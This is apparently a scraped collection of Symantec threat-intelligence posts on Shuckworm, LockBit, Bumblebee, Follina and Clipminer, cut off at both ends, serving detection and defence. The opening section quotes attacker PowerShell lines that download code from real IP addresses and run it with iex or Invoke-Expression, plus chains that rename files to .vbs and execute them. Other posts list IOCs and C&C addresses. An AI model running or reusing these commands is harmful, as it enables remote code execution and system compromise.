CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe -nol -nop $nwc = new-object net.webclient;$nwc.headers['Accept']='image/avif,image/webp,*/*';$nwc.headers['Accept-Encoding']='*';$nwc.headers['Accept-Language']='en-US,en;q=0.5';$nwc.headers['Alt-Used']='www.facebook.com';$nwc.headers['Referer']='https://meta.ua/';$nwc.headers['Sec-Fetch-Dest']='document';$nwc.headers['Sec-Fetch-Mode']='no-cors';$nwc.headers['Sec-Fetch-Site']='cross-site';$nwc.headers['TE']='trailers';$nwc.headers['User-Agent']='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0';$code=([system.text.encoding]::utf8.getstring($nwc.DownloadData('http://45.63.100.72/get.php?fr=3126424&se=3089412&dl=https://meta.ua/uk/news/politics/52320-ukrayina-rozshirila-oboronnu-spivpratsyu-z-danieyu/&rm=https://meta.ua/uk/&kf=false&ts=5875621&dw=2240&dh=1951&t=2053953&s=stable&eec=3242252&po=6485826&ju=8204688&kio=false&rqm=GET')));echo $code|iex CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('http://199.247.25.79/get.php'); Invoke-Expression $tmpCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\delve.prj //e:vbscript /departments /dependant /despite //bCSIDL_SYSTEM\\cmd.exe /c CSIDL_PROFILE\\appdata\\local\\temp\\7zsfx000.cmdCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c del /f /q CSIDL_PROFILE\\30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c del /f /q CSIDL_PROFILE\\8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo '>C:\\Users\\User\\30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo '>C:\\Users\\User\\8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\30802.ico.txt 30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\8527.ico.txt 8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\30802.ico.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\8527.ico.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbs The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/russia-ukraine-shuckworm"
  },
  {
    "title": "lockbit targets servers",
    "content": "Symantec, a division ofBroadcom Software, has observed threat actors targeting server machines in order to spread the LockBit ransomware threat throughout compromised networks. In one attack observed by Symantec, LockBit was seen identifying domain-related information, creating a Group Policy for lateral movement, and executing a \"gpupdate /force\" command on all systems within the same domain, which forcefully updates group policy. LockBit is a ransomware-as-a-service (RaaS) operated by malicious actors Symantec tracks as Syrphid. Shortly after it first appeared in September 2019, the Syrphid gang expanded its operations, using a network of affiliates to deploy the LockBit ransomware on victim networks. The ransomware, which has currently reachedversion 3.0, has evolved over the past few years, as has its operators who have recentlylaunched a bug bounty programin order to weed out weaknesses in the malware’s code and the RaaS operation as a whole. In one observed instance, before dropping and executing the LockBit ransomware, an attacker had RDP access to the enterprise network for a couple of weeks at least. This access may have been obtained through remote desktop applications such as AnyDesk or Windows RDP, or by exploiting a known vulnerability, etc. LockBit behaves differently on server machines with domain controllers than on Windows 10 machines. When executed on a server, it has the capability to spread through the network using Group Policy. On Windows 10 machines it performs routine ransomware activity and encrypts files. When LockBit is executed on a server machine it carries out the following actions: 3. End running processes and disable services 4. Privilege escalation A. Exploiting USERENV.dll to bypass UAC B. Bypass method in hfiref0x’s UACME C. Exploiting the ICMLuaUtil elevated COM Interface-Object 6. LockBit creates a copy of itself under the SYSVOL directory “c:\\windows\\sysvol\\domain\\scripts\\< Lockbit executable>” 7. Creating a Group Policy: Computer configurations: 9. Executes gpupdate command on the domain controller where LockBit is running. Also runs gpupdate to run policies from the computer configurations and user configurations. 12. Encrypts files and appends the .lockbit file extension. LockBit has been one of, if not the most active of RaaS gangs in 2022. The drop in Conti activity in May helped LockBit reach the top spot, with some reports stating that the threat was behind as much as40% of ransomware attacks. LockBit’s success is also due to its developers and affiliates continued evolution of features and tactics, which include the malware’sfast encryption speed, ability to target both Windows andLinux machines, itsbrash recruitment drives, andhigh-profile targets. In addition, as previously mentioned, the launch of a rewards program for vulnerabilities in LockBit’s code and for suggestions on improving the RaaS operation will no-doubt help the ransomware remain a serious threat to organizations. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. Intrusion Prevention System (IPS) Protection Symantec Data Center Security (DCS) hardening policies for Windows Servers and Domain Controllers prevent LockBit ransomware installation. The default DCS lockdown prevents lateral movement of LockBit ransomware on the network and protects servers from LockBit execution attempts to tamper with Group Policies and critical system resources. Vishal is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. Lahu is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/lockbit-targets-servers"
  },
  {
    "title": "bumblebee loader cybercrime",
    "content": "Bumblebee, a recently developed malware loader, has quickly become a key component in a wide range of cyber-crime attacks and appears to have replaced a number of older loaders, which suggests that it is the work of established actors and that the transition to Bumblebee was pre-planned. By analysis of three other tools used in recent attacks involving Bumblebee, Symantec’s Threat Hunter team, a part ofBroadcom Software, has linked this tool to a number of ransomware operations including Conti, Quantum, and Mountlocker. The tactics, techniques, and procedures (TTPs) used in these older attacks support the hypothesis that Bumblebee may have been introduced as a replacement loader for Trickbot and BazarLoader, since there is some overlap between recent activity involving Bumblebee and older attacks linked to these loaders. A recent attack involving the Quantum ransomware demonstrates how Bumblebee is now being leveraged by attackers to deliver ransomware. The initial infection vector was a spear-phishing email with an attachment containing an ISO file. This ISO file contained a Bumblebee DLL file and an LNK file, which loaded the Bumblebee DLL file using rundll32.exe. Bumblebee supports multiple commands like “Ins” for bot persistence, “Dij” for DLL injection, and “Dex” for downloading executables. Bumblebee contacted a command-and-control (C&C) server (45.153.243.93) and created a copy in the %APPDATA% folder with a random name, and also created a VBS file at the same location to load the %APPDATA% DLL file. A scheduled task was created using the Bumblebee “Ins” command to run a VBS file every 15 minutes. After a couple of hours, Bumblebee used the “Dex” command to drop and run a Cobalt Strike payload named “wab.exe” in the %APPDATA% location. It also ran the “systeminfo” command. Using the “Dij” command, Bumblebee then injected the Metasploit DLL into the legitimate process “ImagingDevices.exe”, which is a Windows Photo Viewer executable file. In addition to this, using the “Dij” command Bumblebee injected the Cobalt Strike payload into the legitimate “wab.exe”, which is a Windows Mail executable file. Bumblebee then dropped the AdFind tool using the “Dij” command and tried to enumerate domain-related information like domain trust, domain users, domain groups, and group permissions, etc. At this point, Bumblebee dropped the Quantum ransomware using the “Dij” command. The attacker used both DLL and EXE payloads to encrypt files. Quantum collects system information and user information using WMI. It also checks for SQL-related services and stops them if found running. Quantum also checks for some processes related to malware analysis like procmon, wireshark, cmd, task manager, and notepad, and terminates them if found running. Tools used in recent Bumblebee attacks have appeared in older attacks, pre-dating Bumblebee’s appearance. In a number of attacks involving Bumblebee beginning in mid-May 2022, a version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) was also deployed by the attackers. AdFind is a publicly available tool for querying Active Directory and has been widely used by a range of threat actors in recent years. Similar to the previously mentioned example, malicious ISO files attached to phishing emails were the initial infection vector, with the attackers deploying legitimate ConnectWise remote desktop software (formerly known as ScreenConnect), along with Atera, another legitimate remote access tool, and Meterpreter, a Metasploit in-memory payload that provides a reverse shell to the attacker. In all cases, the attacks never reached the payload stage. However, similarities TTPs used in other attacks suggest that ransomware was the intended payload. This version of AdFind used in these recent Bumblebee attacks has appeared in attacks dating back as far as June 2021, where it was being used in conjunction with Cobalt Strike to deliver the Avaddon ransomware. In August 2021, it reappeared during an unsuccessful ransomware attack when it was used alongside a number of other legitimate software packages including AnyDesk, a publicly available remote desktop tool; Splashtop, another remote desktop tool; and 7-Zip, the publicly available archiving tool. The attack was halted before a ransomware payload could be deployed. During another abortive ransomware attack in May 2022, this variant of AdFind was also deployed. Again, the attackers used Atera in conjunction with Splashtop and AnyDesk. The widely used credential dumping tools Mimikatz and LaZagne were deployed, along with the NetScan network scanner. The attackers also made use of a PowerShell script named cve-2021-34527.ps1 that has previously been linked to Conti’s leaked attack playbook. This version of AdFind also appeared in attacks involving Quantum ransomware during May 2022. The attackers also used Cobalt Strike; Ligolo, a publicly available tunneling tool created for penetration testing purposes, but which has been used by a number of espionage and ransomware actors; ProcDump for credential dumping; along with Rclone, a legitimate open-source tool that can legitimately be used to manage content in the cloud, but is frequently used by ransomware actors to exfiltrate data. More recently, this same version of AdFind was used in an attack attempting to deliver the Diavol payload. The initial loader used by the attackers was not discovered, but the AdFind link with Bumblebee activity suggests it may have been used by the attackers. In early June 2022, Bumblebee was used in a thwarted attack. Although the payload wasn’t deployed, the TTPs used suggested ransomware. The attackers made use of a batch script called adf.bat (SHA256: 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb) along the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) and another version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda). This adf.bat script has been used in attacks since at least 2021. In September 2021, for example, the file was deployed in what appeared to be an attempted ransomware attack. It was used in conjunction with the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682); Cobalt Strike; and PowerSploit, an exploitation framework originally developed for penetration testing. The script was also used in another thwarted ransomware attack in November 2021, again alongside the previously mentioned version of AdFind. Once again the attackers used a number of publicly available tools, including Atera agent and Splashtop, along with Cobalt Strike. While the delivery mechanism wasn’t uncovered, some of the infrastructure used had been previously linked to infrastructure used by BazarLoader, which along with Trickbot, was one of the primary pieces of malware used by the Miner cyber-crime group (aka Wizard Spider). Both were frequently used as part of the delivery mechanism for the group’s ransomware families: Ryuk and Conti. A third version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda) has also been used in recent attacks involving Bumblebee. This tool has been used in ransomware attacks for at least a year. In May 2021, it was used alongside Cobalt Strike in an attempted ransomware attack against a large electronics organization. One feature of this attack was that the attackers installed a VirtualBox VM on some compromised computers. While a VM image was not retrieved, it appeared that the ransomware payload was located on the VM and ran once the operating system was fully booted. The VM likely had access to the host computer’s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer. While the payload wasn’t identified, there were some links to both the Conti and Mountlocker ransomware operations. In another May 2021 attack it was again used in conjunction with Cobalt Strike in another abortive ransomware attack against an organization in the U.S. While the payload was not deployed, some of the TTPs had links to earlier Conti attacks. Also in May 2021, this version of AdFind was leveraged along with Cobalt Strike in an attack against an organization in Canada. In this case, the Conti ransomware was used. Aside from Bumblebee’s links to a range of ransomware attacks, another commonality between many of the attacks investigated is the preponderance of legitimate software tools now being deployed during ransomware attacks. Remote desktop tools such as ConnectWise, Atera, Splashtop, and AnyDesk frequently feature in ransomware investigations, in addition to Rclone, which is now widely leveraged for data exfiltration purposes. More recently, Symantec has seen attackers using the AvosLocker ransomware leveraging PDQ Deploy in their attacks. PDQ Deploy is a legitimate software package that allows users to manage patching on multiple software packages in addition to deploying custom scripts. At least one affiliate of AvosLocker is now using it to execute malicious PowerShell commands on multiple computers on victims’ networks using PowerShell Empire to deploy the AvosLocker payload. Bumblebee’s links to a number of high-profile ransomware operations suggest that it is now at the epicenter of the cyber-crime ecosystem. Any organization that discovers a Bumblebee infection on its network should treat this incident with high priority since it could be the pathway to several dangerous ransomware threats. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 6804cff68d9824efeb087e1d6ff3f98ed947f002626f04cf8ae7ef26b51e394b – Bumblebee daf055e5c7f843a3dbe34c3c7b848e5bbe9c53b65df2556b4b450390154af3bb - Bumblebee 7259b7a91df7c9bc78b0830808fe58c6ff66aa79bb856cf1bf50a107875b3651 – Bumblebee ac20f3f9ed0c1e6b2160976a1dc4167e53fbb8c71b4824a640131acf24c71bfd - Bumblebee 71f91acc6a9162b600ff5191cc22f84a2b726050a5f6d9de292a4deeea0d9803 – Bumblebee f06566e1e309123e03a6a65cdfa06ce5a95fdd276fb7fcbcb33f5560c0a3cd8c – Cobalt Strike 2e349b3224cc0d958e6945623098c2d28cc8977e0d45480c0188febbf7b8aa78 – Bumblebee 302a25e21eea9ab5bc12d1c5f9e5c119619e617677b307fe0e3044c19581faea – Likely Bumblebee 65e205b500160cbec44911080621d25f02ad7fcfcf2c3e75ce33f6f821a808b8 - Bumblebee-related DLL 905e87d8433fa58f3006ee685bb347024b46550a3ceda0777016f39e88519142 - Bumblebee-related DLL 6727d493d4ecc8cca83ed8bf7af63941175decff7218e599355065ae6c9563c4 - Bumblebee-related DLL c8db63bfab805179a1297f8b70a90a043581c9260e8c97725f4920ab93c03344 - Bumblebee-related DLL 261b06e30a4a9960e0b0ae173486a4e456c9bd7d188d0f1c9c109bb9e2281b59- Bumblebee-related DLL 24bf01c1a39c6fcab26173e285d226e0c2dcd8ebf86f820f2ba5339ac29086e5 - Bumblebee-related DLL 86d7f7b265aae9eedb36bc6a8a3f0e8ec5fa08071e2e0d21774a9a8e3d4ed9e7 - Bumblebee-related DLL 4c3d85e7c49928af0f43623dcbed474a157ef50af3cba40b7fd7ac3fe3df2f15 – Unconfirmed, possible VM detection tool b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682 - AdFind 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda - AdFind af.bat 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb – af.bat adf.bat 5a1b3f9589b468a06e9427eae6b0a855d1df6cb35ab71ddbfa05279579e9cda3 – adf.bat ee5fbc193f875a2b8859229508ca79a2ffe19d8a120ae8c5ca77b1d17233d268 - wab.exe 5ad4fa74e71fb4ce0a885b1efb912a00c2ce3c7b4ad251ae67e6c3a8676ede02 - wabmig.exe 02ea7b9948dfc54980fd86dc40b38575c1f401a5a466e5f9fbf9ded33eb1f6a7 - wabmig.exe b722655b93bcb804802f6a20d17492f9c0f08b197b09e8cd57cf3b087ca5a347 - imagingdevices.exe a60136d7377bc1ba8c161021459e9fe9f49c692bf7b397fea676211a2da4444d – Malicious MSI file 86c564e9fb7e45a7b0e03dd5a6e1c72b7d7a4eb42ebe6aa2e8f8a7894bed4cb5 – VBS file 1825e14e1ea19756b55b5ccec5afbb9c2dba0591403c553a83c842bb0dd14432 - ConnectWise 3dea930cfb0ea48c2ce9f7a8bd98ee37e2feca5fb4da8844890fa2d4f62dd105 - Atera 52f145a4ccc0f540a130bedbf04370a842daff1ee8d8361c75a8e0d21a88cf5a - Atera update.exe 3b7512cfa21bd65bd5beecc8cb859ab4f7f5538f3caaf0703a68ec14389b357a - ConnectWise 4c6a865771fdb400456b1e8bc9198134ac9d2f66f1654af42b4b8fc67ae018f2 - ConnectWise fef7d54d6c09a317d95300d10ffcc6c366dbb8f5ebf563dec13b509fff361dc1 - ConnectWise 165b491e5b9e273a61c16de0f592e5047740658c7a2e3047f6bf518a17e59eca - ConnectWise a8faf08997e11a53f9d38797d997c51c1a3fcf89412c3da8dcca6631c6f314a8 - ConnectWise 01e22210e07708c0b9a0061d0f912041808e48bb8d59f960b545d0b9e11d42d2 - ConnectWise f5218aaa046776a12b3683c8da4945a0c4c0934e54802640a15152d9dae15d43 - ConnectWise bc41569c4c9b61f526c78f55993203806d09bb8c3b09dbbeaded61cd1dc2fcc2 - caexec.exe (likely similar to PAExec) 29767c912919cb38903f12c7f41cdd1c5f39fccb9641302c97b981e4b5e31ee5 - vSphere PowerCLI component 911c152d4e37f55bd1544794cc324364b6f03aff118cdf328127355ccc25282a - vSphere PowerCLI component f5cd44f1d72ef8fc734c76ca62879e1f1cb4c0603cfdc0b85b5ad6ad8326f503 - vSphere PowerCLI component 0650722822e984da41d77b90fbd445f28e96a90af87043581896465c06ed1e44 – ConnectWise f01a3f2186e77251acfac9d53122a1579182bde65e694487b292a8e09cf8d465 – Cobalt Strike 290b698d41525c4c74836ca934c0169a989a5eafde7208d90300a17a3f5bd408 – Ransom.Quantum 3d41a002c09448d74070a7eb7c44d49da68b2790b17337686d6dd018012db89d – Ransom.Quantum 51.68.146.200 - AS16276 OVH SAS 154.56.0.221 - AS60602 Inovare-Prim SRL 3.85.198.66 - AS14618 AMAZON-AES 3.144.143.242 - AS16509 AMAZON-02 adaptivenet[.]hostedrmm[.]com hxxp://127.0.0[.]1:[high-ephemeral-port]/ hxxps://ec2-3-144-143-242.us-east-2.compute.amazonaws[.]com hxxps://ec2-3-85-198-66[.]compute-1.amazonaws[.]com adaptivenet[.]hostedrmm[.]com / 52.53.233.237 - AS16509 AMAZON-02 hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.124.zip hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.77.zip hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/transfer/tools/caexec.exe hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Deployment.aspx?Probe=79EA559BB87BF3C8403C40586993D4AC&ID=660 URLs containing URI string \"/LabTech/\" 45.153.243.93 – Bumblebee C&C Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. Intrusion Prevention System Protection For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. Vishal is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/bumblebee-loader-cybercrime"
  },
  {
    "title": "follina msdt exploit malware",
    "content": "Symantec, a division ofBroadcom Software, has observed threat actors exploiting the remote code execution (RCE) vulnerability known as Follina to drop malware onto vulnerable systems just days after the flaw became public on May 27, 2022. Follina (CVE-2022-30190) is a vulnerability in the Microsoft Support Diagnostic Tool (MSDT) that allows remote code execution on vulnerable systems through the ms-msdt protocol handler scheme. The bug is present in all supported versions of Windows. The vulnerability can be easily exploited by a specially crafted Word document that downloads and loads a malicious HTML file through Word’s remote template feature. The HTML file ultimately allows the attacker to load and execute PowerShell code within Windows. The vulnerability can also be exploited through the RTF file format. Exploiting the flaw does not require the use of macros, eliminating the need for an attacker to trick victims into enabling macros for an attack to work. Microsoft has since released advisories and workarounds to mitigate the vulnerability. Since the details of the vulnerability started surfacing online, attackers were quick to start taking advantage of the flaw to install their payloads. Symantec has observed attackers using a similar HTML file to that used in the initial attack. When the HTML document is executed in the context of WinWord, msdt.exegets spawned as a child process. That is because of the protocol handler entry in the registry. Sdiagnhost.exe is then invoked, which is the Scripted Diagnostics Native Host, and under this process the final payload process is created - in our case PowerShell. Multiple attackers are using a variety of payloads at the end of successful exploitation. In one of the instances, Symantec observed the attackers deploying the remote access Trojan AsyncRAT, which had a valid digital signature. When AsyncRAT runs, it carries out the anti-analysis checks shown in Figure 4. Later, AsyncRAT collects information about the infected system, including hardware identification, user name, executed path, and operating system information, and sends it to a command-and-control (C&C) server. AsyncRAT then waits for commands from the C&C server and executes those commands on the victim machine. Symantec has also observed attackers deploying an information stealer as a payload. The code shown in Figure 6 is a snippet from the malware, which steals information including cookies and saved login data from web browsers such as Firefox, Chrome, and Edge. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec protects against these attacks with the following definitions: If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. e7faa6c18d4906257652253755cf8f9a739c10938db369878907f8ed7dd8524d b63fbf80351b3480c62a6a5158334ec8e91fecd057f6c19e4b4dd3febaa9d447 8e0be5e1035777f2ea373593c214d29ad146dd0453e9b8a1cad16d787c0be632 Karthikeyan is a member of Symantec’s Security Technology and Response team which is focused on providing round-the-clock protection against current and future cyber threats. Yuvaraj is a member of Symantec's Security Technology and Response team, whose work includes analyzing malware and providing generic protection for various Symantec products. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/follina-msdt-exploit-malware"
  },
  {
    "title": "clipminer bitcoin mining hijacking",
    "content": "Symantec’s Threat Hunter Team, a part ofBroadcom Software, has uncovered a cyber-criminal operation that has potentially made the actors behind it at least $1.7 million in illicit gains from cryptocurrency mining and theft via clipboard hijacking. The malware being used, tracked by Symantec as Trojan.Clipminer, has a number of similarities to another crypto-mining Trojan calledKryptoCibule, suggesting it may be a copycat or evolution of that threat. Clipminer is likely spread via Trojanized downloads of cracked or pirated software. The malware arrives on compromised computers as a self-extracting WinRAR archive that drops and executes a downloader in the form of a packed portable executable DLL file with CPL file extension (although it does not follow the CPL format). The dropped file connects to the Tor network to download Clipminer’s components. Clipminer has the ability to use compromised computers’ resources to mine for cryptocurrency.  The malware also modifies the clipboard content in an attempt to redirect cryptocurrency transactions by users of the infected computer. On each clipboard update, it scans the clipboard content for wallet addresses, recognizing address formats used by at least a dozen different cryptocurrencies. The recognized addresses are then replaced with addresses of wallets controlled by the attacker. For the majority of the address formats, the attackers provide multiple replacement wallet addresses to choose from. The malware then picks the address that matches the prefix of the address to be replaced. This way, the victim is less likely to notice manipulation and is likely to proceed with the transaction. The malware includes a total of 4,375 unique addresses of wallets controlled by the attacker. Out of these, 3,677 addresses are used for just three different formats of Bitcoin addresses. Investigating just Bitcoin and Ethereum wallet addresses, we found that they, at the time of writing, contained approximately 34.3 Bitcoin and 129.9 Ethereum. However, some funds had also been transferred to what appear to be cryptocurrency tumblers, also known as cryptocurrency mixing services. These services mix potentially identifiable funds with others, so as to obscure the trail back to the fund's original source. If we include the funds transferred out to these services, the malware operators have potentially made at least $1.7 million from clipboard hijacking alone. The infection chain begins with a self-extracting WinRAR archive (bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71) that drops and executes the masqueraded Control Panel (CPL) file: The dropped file is actually a downloader in the form of a packed portable executable DLL, which has the following exports: Once the sample is executed, it arranges for itself to start again in case it gets interrupted. To do so, it renames itself using the following format: It also creates the following registry value: (Note the extra DOT at the end of the filename) Example corresponding registry value: Both of these will be deleted by the sample once it successfully downloads and installs its payload. Next, the malware starts an embedded Tor client by downloadingTor consensus data: Where [HOST_IP_AND_PORT] is picked from a list embedded by the sample. The malware then connects to the Tor network. Next, it collects details from the affected computer, as shown in the following example: [PUBLIC_IPv4_ADDRESS_AS_SEEN_ON_INTERNET];[REDACTED];\"Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz\";L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSystem32\\x005Crundll32.exe\",L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSysWOW64\\x005Crundll32.exe\",L\"C\\x003A\\x005CUsers\\[REDACTED]\\x005CAppData\\x005CLocal\\x005CTemp\\x005CM5aK8iW.cpL\";\"BC711 NVMe SK hynix 128GB[REDACTED];L\"Windows Defender\":61100;\"PCI\\[REDACTED]\":\"Intel(R) UHD Graphics; 630\":1920:1200:59;113:[LIST_OF_RUNNING_PROCESSES];1920:1200:[DESKTOP_SCREENSHOT_AS_BASE64_ENCODED_PNG]; It then sends the following HTTP GET request to an Onion Service over Tor: Where [BINARY_AS_BASE64_ENCODED] is a blob that appears to contain details of the infected machine, and [ONION_SERVICE_AND_PORT] is one of the following: Note that the above are v2 Onion Services. In 2021, v2 Onion Services were depreciated and are no longer supported by current versions of Tor. However, many nodes on the Tor network have yet to be upgraded, meaning the services are still reachable. The received response is roughly 10 MB in size and contains the Clipminer payload, which is used to perform coin mining and clipboard hijacking on the compromised computer. The payload is stored in the following location: Where [EXISTING_TOP_DIRECTORY] is one of the following: The following is an example of the location and directory naming convention used by the malware: It also populates the two newly created directories with files copied from the local machine so that the malicious files are less likely to stand out. It then drops the load point to the inner directory, where file hash, file directory, and file name vary: Then it creates scheduled tasks (similar to the following examples) to execute the load point for persistence (details vary between runs): URI: \\Microsoft\\Windows\\Active Directory Rights Management Services Client\\Microc040e Command: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe Arguments: /u \"C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\\imsgt_dvepr.dll\" WorkingDirectory: C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices It creates the following empty registry key (likely as an infection marker): The loaded payload starts a v3 Onion Service (the address changes per infection). We also observed traces of another v3 Onion Service (possibly used to ping the attackers whenever the compromised machine comes online). The payload will monitor keyboard and mouse activity to determine if the machine is in use. It also appears to monitor running processes, checking for analysis/troubleshooting tools. Whenever the malware determines that a machine is not in use (and at least some of the troubleshooting tools are not used), it starts the XMRig cryptocurrency miner. There are some indications that the attackers used a different miner in the past. Also, it is very likely that a different miner is used when a dedicated GPU is available (e.g. NVIDIA graphics card). We also observed what looks like an XMRig command line (used during injection): The sample includes a list of IPv4 addresses and picks two each time. There is also an example JSONRPC request in memory (before encryption): {\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"x\",\"pass\":\"x\",\"agent\":\"app/1 (Windows NT 10.0; Win64; x64) libuv/1.41.0 msvc/2019 